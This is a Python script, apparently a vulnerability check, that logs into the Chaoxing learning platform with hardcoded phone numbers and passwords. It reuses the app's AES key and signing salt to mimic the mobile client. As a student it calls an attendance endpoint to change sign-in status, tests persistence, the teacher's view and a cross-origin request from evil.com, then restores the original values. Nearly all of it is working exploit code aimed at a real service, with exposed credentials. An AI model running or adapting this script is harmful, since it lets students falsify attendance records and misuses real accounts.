import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"
TEST_AID = "5000163767353"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = any(kw in detail.lower() for kw in ["success", "修改成功"]) or '"state":"success"' in evidence
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"🔴🔴🔴 关键漏洞验证：/newsign/updateSignStatus 学生端直接修改 🔴🔴🔴")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    print("\n[2] 获取活动列表")
    print("=" * 80)

    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_list = d.get("activeList", []) if isinstance(d, dict) else []
    all_aids = [str(act.get("id", "")) for act in active_list]
    print(f"  共 {len(all_aids)} 个活动")

    test_aid = all_aids[0] if all_aids else TEST_AID
    print(f"  使用测试活动: {test_aid}")

    print("\n[3] 查看当前签到状态")
    print("=" * 80)

    r = s_s.get(f"{base}/v2/apis/sign/signIn",
                params={"activeId": test_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    current_status = None
    if isinstance(d, dict) and "data" in d:
        current_status = d["data"].get("status")
    print(f"  当前签到状态: status={current_status}")
    print(f"  完整数据: {json.dumps(d, ensure_ascii=False)[:400]}")

    print("\n[4] 🔴 关键测试：学生调用 /newsign/updateSignStatus")
    print("=" * 80)

    print("\n--- 4.1 基本调用（与之前成功的请求相同参数）---")
    r = s_s.post(f"{base}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": test_aid},
                 data={"uids": STUDENT_PUID, "status": "2", "remark": "",
                       "activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": puid_s},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"  HTTP {r.status_code}")
    print(f"  Response: {r.text[:500]}")
    rec("T4.1-newsign-updateSignStatus-基本", f"HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    print("\n--- 4.2 不带DB_STRATEGY参数 ---")
    r = s_s.post(f"{base}/newsign/updateSignStatus",
                 data={"uids": STUDENT_PUID, "status": "2", "remark": "",
                       "activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": puid_s},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"  Response: {r.text[:500]}")
    rec("T4.2-newsign-noDB", f"HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    print("\n--- 4.3 只传必要参数（activeId, status, uid）---")
    r = s_s.post(f"{base}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": test_aid},
                 data={"status": "2", "uid": puid_s},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"  Response: {r.text[:500]}")
    rec("T4.3-newsign-minimal", f"HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    print("\n--- 4.4 GET方法 ---")
    r = s_s.get(f"{base}/newsign/updateSignStatus",
                params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": test_aid,
                        "uids": STUDENT_PUID, "status": "2", "remark": "",
                        "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest"},
                timeout=20)
    print(f"  Response: {r.text[:500]}")
    rec("T4.4-newsign-GET", f"HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    print("\n--- 4.5 不同status值 ---")
    for status_val in ["0", "1", "3", "4", "5", "6"]:
        r = s_s.post(f"{base}/newsign/updateSignStatus",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": test_aid},
                     data={"uids": STUDENT_PUID, "status": status_val, "remark": "",
                           "activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_s},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
        rec(f"T4.5-newsign-status{status_val}", f"status={status_val}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n--- 4.6 修改后查询签到状态 ---")
    r = s_s.get(f"{base}/v2/apis/sign/signIn",
                params={"activeId": test_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    after_status = None
    if isinstance(d, dict) and "data" in d:
        after_status = d["data"].get("status")
    print(f"  修改后签到状态: status={after_status}")
    print(f"  修改前: {current_status} → 修改后: {after_status}")
    rec("T4.6-after-status", f"修改前status={current_status}, 修改后status={after_status}",
        json.dumps(d, ensure_ascii=False)[:400])

    print("\n[5] 🔴 验证修改是否持久化（修改status=3后查询）")
    print("=" * 80)

    r = s_s.post(f"{base}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": test_aid},
                 data={"uids": STUDENT_PUID, "status": "3", "remark": "安全测试",
                       "activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": puid_s},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"  修改status=3: {r.text[:200]}")
    rec("T5.1-modify-to-3", f"修改status=3: {r.text[:100]}", r.text[:300])

    time.sleep(1)

    r = s_s.get(f"{base}/v2/apis/sign/signIn",
                params={"activeId": test_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    persist_status = None
    if isinstance(d, dict) and "data" in d:
        persist_status = d["data"].get("status")
    print(f"  持久化验证: status={persist_status}")
    rec("T5.2-persist-check", f"修改后status={persist_status}", json.dumps(d, ensure_ascii=False)[:400])

    print("\n[6] 🔴 教师端查询确认")
    print("=" * 80)

    r = s_t.get(f"{base}/v2/apis/sign/signIn",
                params={"activeId": test_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    teacher_view_status = None
    if isinstance(d, dict) and "data" in d:
        teacher_view_status = d["data"].get("status")
    print(f"  教师端查看学生签到状态: status={teacher_view_status}")
    rec("T6-teacher-view", f"教师端查看: status={teacher_view_status}", json.dumps(d, ensure_ascii=False)[:400])

    print("\n[7] 🔴 恢复原始状态")
    print("=" * 80)

    if current_status is not None:
        r = s_s.post(f"{base}/newsign/updateSignStatus",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": test_aid},
                     data={"uids": STUDENT_PUID, "status": str(current_status), "remark": "",
                           "activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_s},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
        print(f"  恢复status={current_status}: {r.text[:100]}")
        rec("T7-restore", f"恢复status={current_status}: {r.text[:100]}", r.text[:300])

    print("\n[8] 🔴 测试其他活动的修改")
    print("=" * 80)

    for aid in all_aids[1:4]:
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        orig_status = None
        if isinstance(d, dict) and "data" in d:
            orig_status = d["data"].get("status")

        r = s_s.post(f"{base}/newsign/updateSignStatus",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                     data={"uids": STUDENT_PUID, "status": "4", "remark": "",
                           "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_s},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
        rec(f"T8-newsign-aid{aid[:8]}", f"aid={aid[:8]}: 原status={orig_status}, 修改后: {r.text[:100]}", r.text[:300])

        if orig_status is not None:
            r = s_s.post(f"{base}/newsign/updateSignStatus",
                         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                         data={"uids": STUDENT_PUID, "status": str(orig_status), "remark": "",
                               "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                               "uid": puid_s},
                         headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                  "Content-Type": "application/x-www-form-urlencoded"},
                         timeout=20)

    print("\n[9] 🔴 CSRF测试（跨域请求）")
    print("=" * 80)

    r = s_s.post(f"{base}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": test_aid},
                 data={"uids": STUDENT_PUID, "status": "2", "remark": "",
                       "activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": puid_s},
                 headers={"Referer": "https://evil.com/", "Origin": "https://evil.com",
                          "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    rec("T9-csrf-test", f"跨域请求: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n[10] 🔴 对比：/pptSign/updateSignStatus vs /newsign/updateSignStatus")
    print("=" * 80)

    r = s_s.post(f"{base}/pptSign/updateSignStatus",
                 data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": puid_s, "studentId": STUDENT_PUID, "status": "2"},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    rec("T10-pptSign-updateSignStatus", f"/pptSign/updateSignStatus: {r.text[:100]}", r.text[:300])

    r = s_s.post(f"{base}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": test_aid},
                 data={"uids": STUDENT_PUID, "status": "2", "remark": "",
                       "activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": puid_s},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    rec("T10-newsign-updateSignStatus", f"/newsign/updateSignStatus: {r.text[:100]}", r.text[:300])

    print("\n[11] 🔴 浏览器控制台场景模拟")
    print("=" * 80)

    s_s_web = requests.Session()
    s_s_web.verify = False
    web_ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0")
    s_s_web.headers.update({"User-Agent": web_ua})

    s_s_web.post("https://passport2.chaoxing.com/fanyalogin",
                 data={"fid": "-1", "uname": "18436633997", "password": "3.1415926Cpy",
                       "refer": "http://i.mooc.chaoxing.com", "t": "true",
                       "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0"},
                 headers={"X-Requested-With": "XMLHttpRequest"},
                 allow_redirects=False, timeout=30)
    try:
        s_s_web.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass

    r = s_s_web.post(f"{base}/newsign/updateSignStatus",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": test_aid},
                     data={"uids": STUDENT_PUID, "status": "2", "remark": "",
                           "activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_s},
                     headers={"Referer": f"{base}/newsign/preSign?courseId={COURSE_ID}&classId={CLASS_ID}&activePrimaryId={test_aid}",
                              "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded",
                              "Origin": f"{base}"},
                     timeout=20)
    rec("T11-browser-console", f"浏览器控制台场景: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n[12] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "newsign_vuln_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if 'success' in r.get("evidence", "").lower() or 'success' in r.get("detail", "").lower())
    print(f"  成功响应: {success}")

if __name__ == "__main__":
    run()
